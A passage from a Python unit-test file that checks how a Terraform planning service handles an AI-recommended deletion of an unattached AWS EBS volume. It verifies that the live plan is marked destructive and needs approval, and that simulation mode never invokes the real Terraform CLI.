            stdout="# aws_ebs_volume.vol_095e4086520c65b70 will be destroyed\nPlan: 0 to add, 0 to change, 1 to destroy."
        )

        unmanaged_ebs = WasteFinding(
            id="f-ebs-live-1",
            resource_id="vol-095e4086520c65b70",
            resource_name="vol-095e4086520c65b70",
            resource_type=ResourceType.EBS,
            waste_category=WasteCategory.UNATTACHED_STORAGE,
            severity=Severity.MEDIUM,
            description="Live unattached EBS volume in ap-southeast-2",
            current_specs="1 GB gp3",
            recommended_specs="Delete / Archive",
            confidence_score=0.99,
            metrics_summary={
                "size_gb": 1,
                "volume_type": "gp3",
                "availability_zone": "ap-southeast-2a",
                "days_unattached": 14,
            },
        )
        rec = AIRecommendation(
            finding_id="f-ebs-live-1",
            resource_id="vol-095e4086520c65b70",
            resource_name="vol-095e4086520c65b70",
            title="Delete Unattached EBS Volume",
            executive_summary="Delete unmanaged volume",
            risk_level="Low Risk",
            rationale="Unattached",
            steps_to_remediate=["Delete"],
            rollback_plan="Restore from snapshot",
            confidence_score=0.98,
            estimated_monthly_savings=0.08,
            action_type="DELETE",
            proposed_action="SNAPSHOT_AND_DELETE",
            terraform_hcl="# Safe deletion\n",
            terraform_explanation="Remove from config",
            model_used="gemini-3.5-flash-lite",
        )

        self.service.region = "ap-southeast-2"
        self.service.use_live_terraform = True
        plan_res = self.service.create_plan(findings=[unmanaged_ebs], recommendations=[rec])

        self.assertTrue(plan_res.success)
        self.assertTrue(plan_res.is_destructive)
        self.assertTrue(plan_res.requires_approval)
        self.assertIn("will be destroyed", plan_res.stdout)
        self.assertIn("1 to destroy", plan_res.stdout)

        # Verified state binding was established
        mock_init.assert_called_once()
        mock_state.assert_called_once()
        mock_import.assert_called_once_with(
            "aws_ebs_volume.vol_095e4086520c65b70",
            "vol-095e4086520c65b70",
            vars={"aws_region": "ap-southeast-2"},
        )
        mock_plan.assert_called_once()
        mock_show.assert_called_once()

    def test_simulation_mode_never_invokes_cli_import(self):
        """Simulation mode strictly never calls real CLI init, import, or plan."""
        sim_service = RealTerraformService(
            workspace_dir=self.workspace_dir,
            source_dir=self.source_dir,
            use_live_terraform=False,
            region_name="ap-southeast-2",
        )

        unmanaged_ebs = WasteFinding(
            id="f-ebs-sim-1",
            resource_id="vol-095e4086520c65b70",
            resource_name="vol-095e4086520c65b70",
            resource_type=ResourceType.EBS,
            waste_category=WasteCategory.UNATTACHED_STORAGE,
            severity=Severity.MEDIUM,
            description="Simulated unattached EBS volume",
            current_specs="1 GB gp3",
            recommended_specs="Delete",
            confidence_score=0.99,
            metrics_summary={"size_gb": 1, "volume_type": "gp3", "availability_zone": "ap-southeast-2a"},
        )

        rec = AIRecommendation(
            finding_id="f-ebs-sim-1",
            resource_id="vol-095e4086520c65b70",
            resource_name="vol-095e4086520c65b70",
            title="Delete Unattached EBS Volume",
            executive_summary="Delete volume",
            risk_level="Low Risk",
            rationale="Unattached",
            steps_to_remediate=["Delete"],
            rollback_plan="Restore",
            confidence_score=0.98,
            estimated_monthly_savings=0.08,
            action_type="DELETE",
            proposed_action="SNAPSHOT_AND_DELETE",
            terraform_hcl="# Sim HCL\n",
            terraform_explanation="Sim explanation",
            model_used="gemini-3.5-flash-lite",
        )

        with patch.object(TerraformCLI, "init") as mock_init, \
             patch.object(TerraformCLI, "import_resource") as mock_import, \
             patch.object(TerraformCLI, "plan") as mock_plan:
            plan_res = sim_service.create_plan(findings=[unmanaged_ebs], recommendations=[rec])

            self.assertTrue(plan_res.success)
            self.assertTrue(plan_res.plan_id.startswith("plan-sim-"))
            mock_init.assert_not_called()
            mock_import.assert_not_called()
            mock_plan.assert_not_called()

            # Ensure plan file contains SIMULATED_PLAN_DATA
            plan_file = Path(plan_res.plan_file)
            self.assertEqual(plan_file.read_text(encoding="utf-8"), "SIMULATED_PLAN_DATA")


if __name__ == "__main__":
    unittest.main()

